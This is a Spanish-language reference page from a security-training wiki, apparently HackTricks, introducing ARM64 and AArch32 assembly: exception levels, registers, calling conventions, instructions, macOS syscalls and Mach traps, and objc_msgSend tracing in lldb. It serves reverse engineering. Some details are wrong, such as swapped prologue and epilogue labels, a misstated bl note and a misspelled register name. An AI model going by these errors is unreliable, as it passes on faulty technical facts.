# Introducción a ARM64v8

{{#include ../../../banners/hacktricks-training.md}}


## **Exception Levels - EL (ARM64v8)**

En la arquitectura ARMv8, los niveles de ejecución, conocidos como Exception Levels (ELs), definen el nivel de privilegio y las capacidades del entorno de ejecución. Hay cuatro exception levels, que van desde EL0 hasta EL3, cada uno con un propósito diferente:

1. **EL0 - User Mode**:
- Este es el nivel con menos privilegios y se usa para ejecutar código de aplicaciones normales.
- Las aplicaciones que se ejecutan en EL0 están aisladas entre sí y del software del sistema, mejorando la seguridad y la estabilidad.
2. **EL1 - Operating System Kernel Mode**:
- La mayoría de los kernels de sistemas operativos se ejecutan en este nivel.
- EL1 tiene más privilegios que EL0 y puede acceder a recursos del sistema, pero con algunas restricciones para garantizar la integridad del sistema. Se pasa de EL0 a EL1 con la instrucción SVC.
3. **EL2 - Hypervisor Mode**:
- Este nivel se utiliza para virtualización. Un hypervisor que se ejecuta en EL2 puede gestionar múltiples sistemas operativos (cada uno en su propio EL1) ejecutándose en el mismo hardware físico.
- EL2 proporciona funcionalidades para el aislamiento y control de los entornos virtualizados.
- Así, aplicaciones de máquinas virtuales como Parallels pueden usar el `hypervisor.framework` para interactuar con EL2 y ejecutar máquinas virtuales sin necesitar extensiones de kernel.
- Para pasar de EL1 a EL2 se usa la instrucción `HVC`.
4. **EL3 - Secure Monitor Mode**:
- Este es el nivel más privilegiado y se usa a menudo para arranque seguro y entornos de ejecución confiables.
- EL3 puede gestionar y controlar accesos entre estados seguros y no seguros (como secure boot, trusted OS, etc.).
- Se usó para KPP (Kernel Patch Protection) en macOS, pero ya no se utiliza.
- EL3 ya no es usado por Apple.
- La transición a EL3 se realiza típicamente usando la instrucción `SMC` (Secure Monitor Call).

El uso de estos niveles permite una forma estructurada y segura de gestionar diferentes aspectos del sistema, desde aplicaciones de usuario hasta el software del sistema con más privilegios. El enfoque de ARMv8 en los niveles de privilegio ayuda a aislar eficazmente los distintos componentes del sistema, mejorando así la seguridad y la robustez del sistema.

## **Registers (ARM64v8)**

ARM64 tiene **31 registros de propósito general**, etiquetados `x0` hasta `x30`. Cada uno puede almacenar un valor de **64 bits** (8 bytes). Para operaciones que requieren solo valores de 32 bits, los mismos registros pueden accederse en modo de 32 bits usando los nombres `w0` hasta `w30`.

1. **`x0`** a **`x7`** - Normalmente se usan como registros temporales y para pasar parámetros a subrutinas.
- **`x0`** también porta los datos de retorno de una función
2. **`x8`** - En el kernel de Linux, `x8` se usa como el número de sistema para la instrucción `svc`. **En macOS el x16 es el que se usa!**
3. **`x9`** a **`x15`** - Más registros temporales, frecuentemente usados para variables locales.
4. **`x16`** y **`x17`** - **Intra-procedural Call Registers**. Registros temporales para valores inmediatos. También se usan para llamadas indirectas a funciones y stubs de PLT (Procedure Linkage Table).
- **`x16`** se usa como el **número de syscall** para la instrucción **`svc`** en **macOS**.
5. **`x18`** - **Platform register**. Puede usarse como registro de propósito general, pero en algunas plataformas este registro está reservado para usos específicos de la plataforma: pointer al current thread environment block en Windows, o para apuntar a la estructura de tarea que se está ejecutando en el kernel de linux.
6. **`x19`** a **`x28`** - Estos son registros preservados por el callee (callee-saved). Una función debe preservar los valores de estos registros para su caller, por lo que se almacenan en la pila y se recuperan antes de volver al caller.
7. **`x29`** - **Frame pointer** para rastrear el stack frame. Cuando se crea un nuevo frame en la pila porque se llama a una función, el registro **`x29`** se **almacena en la pila** y la dirección del **nuevo** frame pointer (la dirección de **`sp`**) se **almacena en este registro**.
- Este registro también puede usarse como registro de propósito general aunque normalmente se usa como referencia para **local variables**.
8. **`x30`** o **`lr`**- **Link register**. Contiene la **dirección de retorno** cuando se ejecuta una instrucción `BL` (Branch with Link) o `BLR` (Branch with Link to Register) almacenando el valor del **`pc`** en este registro.
- También puede usarse como cualquier otro registro.
- Si la función actual va a llamar a una nueva función y por tanto sobrescribir `lr`, lo almacenará en la pila al inicio; esto es el epílogo (`stp x29, x30 , [sp, #-48]; mov x29, sp` -> Store `fp` and `lr`, generate space and get new `fp`) y lo recupera al final, esto es el prologue (`ldp x29, x30, [sp], #48; ret` -> Recover `fp` and `lr` and return).
9. **`sp`** - **Stack pointer**, usado para llevar el seguimiento de la cima de la pila.
- El valor de **`sp`** debe mantenerse con al menos una **alineación de quadword** o puede ocurrir una excepción de alineación.
10. **`pc`** - **Program counter**, que apunta a la siguiente instrucción. Este registro solo puede actualizarse mediante la generación de excepciones, retornos de excepción y saltos. Las únicas instrucciones ordinarias que pueden leer este registro son las branch with link (BL, BLR) para almacenar la dirección del **`pc`** en **`lr`** (Link Register).
11. **`xzr`** - **Zero register**. También llamado **`wzr`** en su forma de registro de **32** bits. Puede usarse para obtener fácilmente el valor cero (operación común) o para realizar comparaciones usando **`subs`** como **`subs XZR, Xn, #10`** almacenando el dato resultante en ninguna parte (en **`xzr`**).

Los registros **`Wn`** son la versión de **32bit** del registro **`Xn`**.

> [!TIP]
> Los registros de X0 a X18 son volátiles, lo que significa que sus valores pueden cambiar por llamadas a funciones e interrupciones. Sin embargo, los registros de X19 a X28 son no volátiles, lo que significa que sus valores deben preservarse a través de llamadas a funciones ("callee saved").

### SIMD and Floating-Point Registers

Además, existen otros **32 registros de 128bit de longitud** que pueden usarse en operaciones SIMD (single instruction multiple data) optimizadas y para realizar aritmética de punto flotante. Estos se llaman registros Vn aunque también pueden operar en **64**-bit, **32**-bit, **16**-bit y **8**-bit y entonces se denominan **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** y **`Bn`**.

### System Registers

**Existen cientos de system registers**, también llamados special-purpose registers (SPRs), que se usan para **monitorizar** y **controlar** el comportamiento de los **procesadores**.\
Solo pueden leerse o escribirse usando las instrucciones dedicadas especiales **`mrs`** y **`msr`**.

Los registros especiales **`TPIDR_EL0`** y **`TPIDDR_EL0`** son comúnmente encontrados al hacer reversing engineering. El sufijo `EL0` indica la **exception mínima** desde la cual el registro puede ser accedido (en este caso EL0 es el nivel de excepción (privilegio) regular en el que los programas normales se ejecutan).\
A menudo se usan para almacenar la **dirección base del thread-local storage** en memoria. Usualmente el primero es legible y escribible para programas ejecutándose en EL0, pero el segundo puede leerse desde EL0 y escribirse desde EL1 (como el kernel).

- `mrs x0, TPIDR_EL0 ; Read TPIDR_EL0 into x0`
- `msr TPIDR_EL0, X0 ; Write x0 into TPIDR_EL0`

### **PSTATE**

**PSTATE** contiene varios componentes del proceso serializados en el registro especial visible para el sistema operativo **`SPSR_ELx`**, siendo X el **nivel de permiso de la excepción** disparada (esto permite recuperar el estado del proceso cuando la excepción termina).\
Estos son los campos accesibles:

<figure><img src="../../../images/image (1196).png" alt=""><figcaption></figcaption></figure>

- Las banderas de condición **`N`**, **`Z`**, **`C`** y **`V`**:
- **`N`** significa que la operación dio como resultado un valor negativo
- **`Z`** significa que la operación dio como resultado cero
- **`C`** significa que la operación generó un carry
- **`V`** significa que la operación produjo un overflow con signo:
- La suma de dos números positivos da como resultado un número negativo.
- La suma de dos números negativos da como resultado un número positivo.
- En la resta, cuando se sustrae un número muy negativo de un número positivo más pequeño (o viceversa), y el resultado no puede representarse dentro del rango del tamaño de bits dado.
- Obviamente el procesador no sabe si la operación es con signo o sin signo, así que comprobará C y V en las operaciones e indicará si ocurrió un carry en caso de que fuese con signo o sin signo.

> [!WARNING]
> No todas las instrucciones actualizan estas banderas. Algunas como **`CMP`** o **`TST`** sí lo hacen, y otras que tienen un sufijo s como **`ADDS`** también lo hacen.

- La bandera del **ancho actual de registro (`nRW`)**: Si la bandera tiene el valor 0, el programa se ejecutará en el estado de ejecución AArch64 una vez reanudado.
- El **Exception Level** actual (**`EL`**): Un programa regular ejecutándose en EL0 tendrá el valor 0
- La bandera de **single stepping** (**`SS`**): Usada por debuggers para ejecutar paso a paso estableciendo la bandera SS a 1 dentro de **`SPSR_ELx`** a través de una excepción. El programa ejecutará un paso y emitirá una excepción de single step.
- La bandera de **estado de excepción ilegal** (**`IL`**): Se usa para marcar cuando un software privilegiado realiza una transferencia a un nivel de excepción inválido; esta bandera se pone a 1 y el procesador dispara una excepción de estado ilegal.
- Las banderas **`DAIF`**: Estas banderas permiten a un programa privilegiado enmascarar selectivamente ciertas excepciones externas.
- Si **`A`** es 1 significa que se dispararán **asynchronous aborts**. La **`I`** configura la respuesta a solicitudes de interrupción hardware externas (IRQs). y la F está relacionada con **Fast Interrupt Requests** (FIRs).
- Las banderas de **selección de puntero de pila** (**`SPS`**): Los programas privilegiados que se ejecutan en EL1 y superiores pueden alternar entre usar su propio registro de puntero de pila y el del modelo de usuario (por ejemplo, entre `SP_EL1` y `EL0`). Este cambio se realiza escribiendo en el registro especial **`SPSel`**. Esto no puede hacerse desde EL0.

## **Calling Convention (ARM64v8)**

La calling convention de ARM64 especifica que los **ocho primeros parámetros** a una función se pasan en los registros **`x0`** hasta **`x7`**. Los parámetros **adicionales** se pasan en la **pila**. El valor de **retorno** se devuelve en el registro **`x0`**, o también en **`x1`** si tiene **128 bits**. Los registros **`x19`** a **`x30`** y **`sp`** deben **preservarse** a través de llamadas a funciones.

Al leer una función en ensamblador, busca el **prologue y epilogue** de la función. El **prologue** normalmente implica **guardar el frame pointer (`x29`)**, **configurar** un **nuevo frame pointer**, y **asignar espacio en la pila**. El **epilogue** normalmente implica **restaurar el frame pointer guardado** y **retornar** de la función.

### Calling Convention in Swift

Swift tiene su propia **calling convention** que puede encontrarse en [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)

## **Common Instructions (ARM64v8)**

Las instrucciones ARM64 generalmente tienen el **formato `opcode dst, src1, src2`**, donde **`opcode`** es la **operación** a realizar (como `add`, `sub`, `mov`, etc.), **`dst`** es el registro **destino** donde se almacenará el resultado, y **`src1`** y **`src2`** son los registros **fuente**. También se pueden usar valores inmediatos en lugar de registros fuente.

- **`mov`**: **Mover** un valor de un **registro** a otro.
- Ejemplo: `mov x0, x1` — Esto mueve el valor de `x1` a `x0`.
- **`ldr`**: **Cargar** un valor desde **memoria** a un **registro**.
- Ejemplo: `ldr x0, [x1]` — Esto carga un valor desde la dirección de memoria apuntada por `x1` en `x0`.
- **Modo offset**: Se indica un offset que afecta al puntero origen, por ejemplo:
- `ldr x2, [x1, #8]`, esto cargará en x2 el valor desde x1 + 8
- `ldr x2, [x0, x1, lsl #2]`, esto cargará en x2 un objeto desde el array x0, desde la posición x1 (índice) * 4
- **Modo pre-indexado**: Esto aplicará cálculos al origen, obtendrá el resultado y también almacenará el nuevo origen en el origen.
- `ldr x2, [x1, #8]!`, esto cargará `x1 + 8` en `x2` y almacenará en x1 el resultado de `x1 + 8`
- `str lr, [sp, #-4]!`, Almacena el link register en sp y actualiza el registro sp
- **Modo post-index**: Esto es como el anterior pero la dirección de memoria se accede y luego se calcula y almacena el offset.
- `ldr x0, [x1], #8`, carga `x1` en `x0` y actualiza x1 con `x1 + 8`
- **Dirección relativa al PC**: En este caso la dirección a cargar se calcula relativa al registro PC
- `ldr x1, =_start`, Esto cargará en x1 la dirección donde comienza el símbolo `_start` en relación con el PC actual.
- **`str`**: **Almacenar** un valor desde un **registro** en **memoria**.
- Ejemplo: `str x0, [x1]` — Esto almacena el valor en `x0` en la dirección de memoria apuntada por `x1`.
- **`ldp`**: **Load Pair of Registers**. Esta instrucción **carga dos registros** desde **ubicaciones de memoria consecutivas**. La dirección de memoria típicamente se forma sumando un offset al valor en otro registro.
- Ejemplo: `ldp x0, x1, [x2]` — Esto carga `x0` y `x1` desde las ubicaciones de memoria en `x2` y `x2 + 8`, respectivamente.
- **`stp`**: **Store Pair of Registers**. Esta instrucción **almacena dos registros** en **ubicaciones de memoria consecutivas**. La dirección de memoria típicamente se forma sumando un offset al valor en otro registro.
- Ejemplo: `stp x0, x1, [sp]` — Esto almacena `x0` y `x1` en las ubicaciones de memoria en `sp` y `sp + 8`, respectivamente.
- `stp x0, x1, [sp, #16]!` — Esto almacena `x0` y `x1` en las ubicaciones de memoria en `sp+16` y `sp + 24`, respectivamente, y actualiza `sp` con `sp+16`.
- **`add`**: **Sumar** los valores de dos registros y almacenar el resultado en un registro.
- Sintaxis: add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
- Xn1 -> Destino
- Xn2 -> Operando 1
- Xn3 | #imm -> Operando 2 (registro o inmediato)
- \[shift #N | RRX] -> Realizar un shift o usar RRX
- Ejemplo: `add x0, x1, x2` — Esto suma los valores en `x1` y `x2` y almacena el resultado en `x0`.
- `add x5, x5, #1, lsl #12` — Esto equivale a 4096 (un 1 desplazado 12 posiciones) -> 1 0000 0000 0000 0000
- **`adds`** Esto realiza un `add` y actualiza las flags
- **`sub`**: **Restar** los valores de dos registros y almacenar el resultado en un registro.
- Ver **sintaxis** de **`add`**.
- Ejemplo: `sub x0, x1, x2` — Esto resta el valor en `x2` de `x1` y almacena el resultado en `x0`.
- **`subs`** Esto es como sub pero actualiza las flags
- **`mul`**: **Multiplicar** los valores de **dos registros** y almacenar el resultado en un registro.
- Ejemplo: `mul x0, x1, x2` — Esto multiplica los valores en `x1` y `x2` y almacena el resultado en `x0`.
- **`div`**: **Dividir** el valor de un registro por otro y almacenar el resultado en un registro.
- Ejemplo: `div x0, x1, x2` — Esto divide el valor en `x1` por `x2` y almacena el resultado en `x0`.
- **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`**:
- **Logical shift left**: Añade 0s al final moviendo los otros bits hacia adelante (multiplica por n veces 2)
- **Logical shift right**: Añade 0s al principio moviendo los otros bits hacia atrás (divide por n veces 2 en unsigned)
- **Arithmetic shift right**: Como **`lsr`**, pero en lugar de añadir 0s si el bit más significativo es 1, se añaden 1s (divide por n veces 2 en signed)
- **Rotate right**: Como **`lsr`** pero lo que se elimina por la derecha se anexa a la izquierda
- **Rotate Right with Extend**: Como **`ror`**, pero con la flag de carry como el "bit más significativo". Así la flag de carry se mueve al bit 31 y el bit eliminado va a la flag de carry.
- **`bfm`**: **Bit Filed Move**, estas operaciones **copian bits `0...n`** desde un valor y los colocan en posiciones **`m..m+n`**. El **`#s`** especifica la **posición del bit más a la izquierda** y **`#r`** la **cantidad de rotación a la derecha**.
- Bitfield move: `BFM Xd, Xn, #r`
- Signed Bitfield move: `SBFM Xd, Xn, #r, #s`
- Unsigned Bitfield move: `UBFM Xd, Xn, #r, #s`
- **Bitfield Extract and Insert:** Copiar un bitfield de un registro y copiarlo a otro registro.
- **`BFI X1, X2, #3, #4`** Insertar 4 bits desde X2 a partir del bit 3 en X1
- **`BFXIL X1, X2, #3, #4`** Extraer desde el bit 3 de X2 cuatro bits y copiarlos a X1
- **`SBFIZ X1, X2, #3, #4`** Extiende con signo 4 bits desde X2 e inserta en X1 comenzando en la posición de bit 3, poniendo a cero los bits de la derecha
- **`SBFX X1, X2, #3, #4`** Extrae 4 bits empezando en el bit 3 de X2, los extiende con signo y coloca el resultado en X1
- **`UBFIZ X1, X2, #3, #4`** Extiende con ceros 4 bits desde X2 e inserta en X1 empezando en la posición de bit 3, poniendo a cero los bits de la derecha
- **`UBFX X1, X2, #3, #4`** Extrae 4 bits empezando en el bit 3 de X2 y coloca el resultado extendido con ceros en X1.
- **Sign Extend To X:** Extiende el signo (o añade solo 0s en la versión sin signo) de un valor para poder realizar operaciones con él:
- **`SXTB X1, W2`** Extiende el signo de un byte **desde W2 a X1** (`W2` es la mitad de `X2`) para rellenar 64 bits
- **`SXTH X1, W2`** Extiende el signo de un número de 16 bits **desde W2 a X1** para rellenar 64 bits
- **`SXTW X1, W2`** Extiende el signo de un valor **desde W2 a X1** para rellenar 64 bits
- **`UXTB X1, W2`** Añade 0s (unsigned) a un byte **desde W2 a X1** para rellenar 64 bits
- **`extr`:** Extrae bits de un par de registros concatenados especificados.
- Ejemplo: `EXTR W3, W2, W1, #3` Esto concatenará W1+W2 y obtendrá **desde el bit 3 de W2 hasta el bit 3 de W1** y lo almacenará en W3.
- **`cmp`**: **Comparar** dos registros y establecer las flags de condición. Es un **alias de `subs`** estableciendo el registro destino al registro cero. Útil para saber si `m == n`.
- Soporta la **misma sintaxis que `subs`**
- Ejemplo: `cmp x0, x1` — Esto compara los valores en `x0` y `x1` y establece las flags de condición en consecuencia.
- **`cmn`**: **Compare negative** operand. En este caso es un **alias de `adds`** y soporta la misma sintaxis. Útil para saber si `m == -n`.
- **`ccmp`**: Comparación condicional, es una comparación que solo se realizará si una comparación previa fue verdadera y establecerá específicamente bits nzcv.
- `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> si x1 != x2 y x3 < x4, saltar a func
- Esto es porque **`ccmp`** solo se ejecutará si el **cmp** previo fue `NE`; si no lo fue, los bits `nzcv` se establecerán a 0 (lo que no satisfará la comparación `blt`).
- Esto también puede usarse como `ccmn` (igual pero negativo, como `cmp` vs `cmn`).
- **`tst`**: Comprueba si alguno de los bits indicados en el valor y el registro comparado son 1 (funciona como un ANDS sin almacenar el resultado en ninguna parte). Es útil para comprobar un registro con un valor y saber si alguno de los bits del registro indicado por el valor es 1.
- Ejemplo: `tst X1, #7` Comprueba si alguno de los últimos 3 bits de X1 es 1
- **`teq`**: Operación XOR descartando el resultado
- **`b`**: Branch incondicional
- Ejemplo: `b myFunction`
- Nota que esto no llena el link register con la dirección de retorno (no es adecuado para llamadas a subrutinas que necesitan volver)
- **`bl`**: **Branch** con link, usado para **llamar** a una **subrutina**. Almacena la **dirección de retorno en `x30`**.
- Ejemplo: `bl myFunction` — Esto llama a la función `myFunction` y almacena la dirección de retorno en `x30`.
- Nota que esto no llena el link register con la dirección de retorno (no es adecuado para subrutinas que necesitan volver)
- **`blr`**: **Branch** con Link a Registro, usado para **llamar** a una **subrutina** donde el objetivo está **especificado** en un **registro**. Almacena la dirección de retorno en `x30`. (Esto es
- Ejemplo: `blr x1` — Esto llama a la función cuya dirección está contenida en `x1` y almacena la dirección de retorno en `x30`.
- **`ret`**: **Retornar** de una **subrutina**, típicamente usando la dirección en **`x30`**.
- Ejemplo: `ret` — Esto retorna de la subrutina actual usando la dirección de retorno en `x30`.
- **`b.<cond>`**: Branches condicionales
- **`b.eq`**: **Branch si igual**, basado en la instrucción `cmp` previa.
- Ejemplo: `b.eq label` — Si la instrucción `cmp` previa encontró dos valores iguales, salta a `label`.
- **`b.ne`**: **Branch si No Igual**. Esta instrucción comprueba las flags de condición (que fueron establecidas por una instrucción de comparación previa), y si los valores comparados no eran iguales, hace branching a una etiqueta o dirección.
- Ejemplo: Tras una instrucción `cmp x0, x1`, `b.ne label` — Si los valores en `x0` y `x1` no eran iguales, salta a `label`.
- **`cbz`**: **Compare and Branch on Zero**. Esta instrucción compara un registro con cero, y si son iguales, hace branching a una etiqueta o dirección.
- Ejemplo: `cbz x0, label` — Si el valor en `x0` es cero, salta a `label`.
- **`cbnz`**: **Compare and Branch on Non-Zero**. Esta instrucción compara un registro con cero, y si no son iguales, hace branching a una etiqueta o dirección.
- Ejemplo: `cbnz x0, label` — Si el valor en `x0` no es cero, salta a `label`.
- **`tbnz`**: Test bit and branch on nonzero
- Ejemplo: `tbnz x0, #8, label`
- **`tbz`**: Test bit and branch on zero
- Ejemplo: `tbz x0, #8, label`
- **Operaciones de selección condicional**: Son operaciones cuyo comportamiento varía dependiendo de las flags condicionales.
- `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> Si es true, X0 = X1, si es false, X0 = X2
- `csinc Xd, Xn, Xm, cond` -> Si es true, Xd = Xn, si es false, Xd = Xm + 1
- `cinc Xd, Xn, cond` -> Si es true, Xd = Xn + 1, si es false, Xd = Xn
- `csinv Xd, Xn, Xm, cond` -> Si es true, Xd = Xn, si es false, Xd = NOT(Xm)
- `cinv Xd, Xn, cond` -> Si es true, Xd = NOT(Xn), si es false, Xd = Xn
- `csneg Xd, Xn, Xm, cond` -> Si es true, Xd = Xn, si es false, Xd = - Xm
- `cneg Xd, Xn, cond` -> Si es true, Xd = - Xn, si es false, Xd = Xn
- `cset Xd, Xn, Xm, cond` -> Si es true, Xd = 1, si es false, Xd = 0
- `csetm Xd, Xn, Xm, cond` -> Si es true, Xd = \<all 1>, si es false, Xd = 0
- **`adrp`**: Calcula la **dirección de página de un símbolo** y la guarda en un registro.
- Ejemplo: `adrp x0, symbol` — Esto calcula la dirección de página de `symbol` y la guarda en `x0`.
- **`ldrsw`**: **Carga** un valor con signo de **32 bits** desde memoria y lo **extiende con signo** a 64 bits. Esto se usa para casos comunes de SWITCH.
- Ejemplo: `ldrsw x0, [x1]` — Esto carga un valor con signo de 32 bits desde la dirección de memoria apuntada por `x1`, lo extiende con signo a 64 bits y lo guarda en `x0`.
- **`stur`**: **Almacenar el valor de un registro en una ubicación de memoria**, usando un offset desde otro registro.
- Ejemplo: `stur x0, [x1, #4]` — Esto almacena el valor en `x0` en la dirección de memoria que es 4 bytes mayor que la dirección actualmente en `x1`.
- **`svc`** : Hacer una **system call**. Significa "Supervisor Call". Cuando el procesador ejecuta esta instrucción, **cambia de user mode a kernel mode** y salta a una ubicación específica en memoria donde está el código de manejo de system call del **kernel**.

- Ejemplo:

```armasm
mov x8, 93  ; Load the system call number for exit (93) into register x8.
mov x0, 0   ; Load the exit status code (0) into register x0.
svc 0       ; Make the system call.
```

### **Function Prologue**

1. **Guardar el link register y el frame pointer en la pila**:
```armasm
stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
```
2. **Configurar el nuevo puntero de marco**: `mov x29, sp` (establece el nuevo puntero de marco para la función actual)
3. **Asignar espacio en la pila para variables locales** (si es necesario): `sub sp, sp, <size>` (donde `<size>` es el número de bytes necesarios)

### **Epílogo de la función**

1. **Liberar las variables locales (si se asignaron)**: `add sp, sp, <size>`
2. **Restaurar el registro de enlace y el puntero de marco**:
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
3. **Return**: `ret` (devuelve el control al llamador usando la dirección en el registro de enlace)

## ARM Common Memory Protections

{{#ref}}
../../../binary-exploitation/ios-exploiting/README.md
{{#endref}}

## AARCH32 Execution State

Armv8-A admite la ejecución de programas de 32 bits. **AArch32** puede ejecutar uno de **dos conjuntos de instrucciones**: **`A32`** y **`T32`** y puede cambiar entre ellos mediante **`interworking`**.\
Los programas de 64 bits **privilegiados** pueden programar la **ejecución de programas de 32 bits** ejecutando una transferencia de nivel de excepción al 32 bits de menor privilegio.\
Tenga en cuenta que la transición de 64 bits a 32 bits ocurre con un nivel de excepción inferior (por ejemplo, un programa de 64 bits en EL1 que lanza un programa en EL0). Esto se hace estableciendo el **bit 4 de** el registro especial **`SPSR_ELx`** **a 1** cuando el hilo de proceso `AArch32` está listo para ejecutarse y el resto de `SPSR_ELx` almacena el CPSR del programa `AArch32`. Luego, el proceso privilegiado ejecuta la instrucción **`ERET`** para que el procesador transicione a **`AArch32`**, entrando en A32 o T32 dependiendo de CPSR.

El **`interworking`** ocurre usando los bits J y T del CPSR. `J=0` y `T=0` significa **`A32`** y `J=0` y `T=1` significa **T32**. Básicamente esto se traduce en establecer el **bit menos significativo a 1** para indicar que el conjunto de instrucciones es T32.\
Esto se establece durante las **interworking branch instructions,** pero también puede establecerse directamente con otras instrucciones cuando el PC se configura como el registro destino. Ejemplo:

Otro ejemplo:
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### Registros

Hay 16 registros de 32 bits (r0-r15). **Desde r0 hasta r14** pueden usarse para **cualquier operación**, sin embargo algunos de ellos suelen reservarse:

- **`r15`**: Contador de programa (siempre). Contiene la dirección de la próxima instrucción. En A32 actual + 8, en T32 actual + 4.
- **`r11`**: Puntero de marco
- **`r12`**: Registro de llamada intra-procedimiento
- **`r13`**: Puntero de pila (Nota: la pila siempre está alineada a 16 bytes)
- **`r14`**: Registro de enlace

Moreover, registers are backed up in **`banked registries`**. Which are places that store the registers values allowing to perform **conmutación rápida de contexto** en el manejo de excepciones y operaciones privilegiadas para evitar la necesidad de guardar y restaurar manualmente los registros cada vez.\
This is done by **saving the processor state from the `CPSR` to the `SPSR`** of the processor mode to which the exception is taken. On the exception returns, the **`CPSR`** is restored from the **`SPSR`**.

### CPSR - Registro de estado actual del programa

En AArch32 el CPSR funciona de forma similar a **`PSTATE`** en AArch64 y también se almacena en **`SPSR_ELx`** cuando se toma una excepción para restaurar posteriormente la ejecución:

<figure><img src="../../../images/image (1197).png" alt=""><figcaption></figcaption></figure>

Los campos están divididos en algunos grupos:

- Application Program Status Register (APSR): Banderas aritméticas y accesible desde EL0
- Execution State Registers: Comportamiento del proceso (gestionado por el SO).

#### Application Program Status Register (APSR)

- Las banderas **`N`**, **`Z`**, **`C`**, **`V`** (igual que en AArch64)
- La bandera **`Q`**: Se pone a 1 siempre que ocurra **saturación entera** durante la ejecución de una instrucción aritmética de saturación especializada. Una vez puesta a **`1`**, mantendrá el valor hasta que se ponga manualmente a 0. Además, no existe instrucción que compruebe su valor implícitamente; debe leerse manualmente.
- **`GE`** (Greater than or equal) Flags: Se usan en operaciones SIMD (Single Instruction, Multiple Data), como "suma paralela" y "resta paralela". Estas operaciones permiten procesar múltiples puntos de datos en una sola instrucción.

Por ejemplo, la instrucción **`UADD8`** **suma cuatro pares de bytes** (de dos operandos de 32 bits) en paralelo y almacena los resultados en un registro de 32 bits. Luego **establece las banderas `GE` en el `APSR`** basándose en esos resultados. Cada bandera GE corresponde a una de las sumas de bytes, indicando si la suma para ese par de bytes **desbordó**.

La instrucción **`SEL`** usa estas banderas GE para realizar acciones condicionales.

#### Execution State Registers

- Los bits **`J`** y **`T`**: **`J`** debe ser 0 y si **`T`** es 0 se usa el conjunto de instrucciones A32, y si es 1, se usa T32.
- IT Block State Register (`ITSTATE`): Son los bits 10-15 y 25-26. Almacenan condiciones para instrucciones dentro de un grupo prefijado por **`IT`**.
- **`E`** bit: Indica el orden de bytes (endianness).
- Mode and Exception Mask Bits (0-4): Determinan el estado de ejecución actual. El **5º** indica si el programa se ejecuta como 32bit (un 1) o 64bit (un 0). Los otros 4 representan el modo de excepción actualmente en uso (cuando ocurre una excepción y se está manejando). El número establecido **indica la prioridad actual** en caso de que se dispare otra excepción mientras ésta se está manejando.

<figure><img src="../../../images/image (1200).png" alt=""><figcaption></figcaption></figure>

- **`AIF`**: Ciertas excepciones pueden desactivarse usando los bits **`A`**, `I`, `F`. Si **`A`** es 1 significa que se dispararán abortos asincrónicos. El **`I`** configura la respuesta a solicitudes de interrupción (IRQs) de hardware externo, y la **`F`** está relacionada con solicitudes de interrupción rápida (FIRs).

## macOS

### BSD syscalls

Consulta [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master) o ejecuta `cat /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/include/sys/syscall.h`. BSD syscalls tendrán **x16 > 0**.

### Mach Traps

Consulta en [**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html) la `mach_trap_table` y en [**mach_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h) los prototipos. El número máximo de Mach traps es `MACH_TRAP_TABLE_COUNT` = 128. Mach traps tendrán **x16 < 0**, por lo que necesitas llamar a los números de la lista anterior con un **signo menos**: **`_kernelrpc_mach_vm_allocate_trap`** es **`-10`**.

También puedes revisar **`libsystem_kernel.dylib`** en un desensamblador para encontrar cómo llamar a estos (y a los syscalls BSD):
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
Note that **Ida** and **Ghidra** can also decompile **specific dylibs** from the cache just by passing the cache.

> [!TIP]
> A veces es más fácil revisar el código **descompilado** de **`libsystem_kernel.dylib`** **que** revisar el **código fuente** porque el código de varios syscalls (BSD y Mach) se genera mediante scripts (revisa los comentarios en el código fuente) mientras que en el dylib puedes encontrar qué se está llamando.

### machdep calls

XNU admite otro tipo de llamadas llamadas dependientes de la máquina. Los números de estas llamadas dependen de la arquitectura y ni las llamadas ni los números están garantizados a permanecer constantes.

### comm page

Esta es una página de memoria propiedad del kernel que se mapea en el espacio de direcciones de cada proceso de usuario. Está diseñada para hacer la transición de modo de usuario a espacio del kernel más rápida que usar syscalls para servicios del kernel que se usan tan frecuentemente que esta transición sería muy ineficiente.

For example the call `gettimeofdate` reads the value of `timeval` directly from the comm page.

### objc_msgSend

It's super common to find this function used in Objective-C or Swift programs. This function allows to call a method of an objective-C object.

Parameters ([more info in the docs](https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend)):

- x0: self -> Puntero a la instancia
- x1: op -> Selector del método
- x2... -> Resto de los argumentos del método invocado

So, if you put breakpoint before the branch to this function, you can easily find what is invoked in lldb with (in this example the object calls an object from `NSConcreteTask` that will run a command):
```bash
# Right in the line were objc_msgSend will be called
(lldb) po $x0
<NSConcreteTask: 0x1052308e0>

(lldb) x/s $x1
0x1736d3a6e: "launch"

(lldb) po [$x0 launchPath]
/bin/sh

(lldb) po [$x0 arguments]
<__NSArrayI 0x1736801e0>(
-c,
whoami
)
```
> [!TIP]
> Al establecer la variable de entorno **`NSObjCMessageLoggingEnabled=1`** es posible hacer log de cuándo se llama a esta función en un archivo como `/tmp/msgSends-pid`.
>
> Además, al establecer **`OBJC_HELP=1`** y ejecutar cualquier binario puedes ver otras variables de entorno que podrías usar para **log** cuando ocurren ciertas acciones Objc-C.

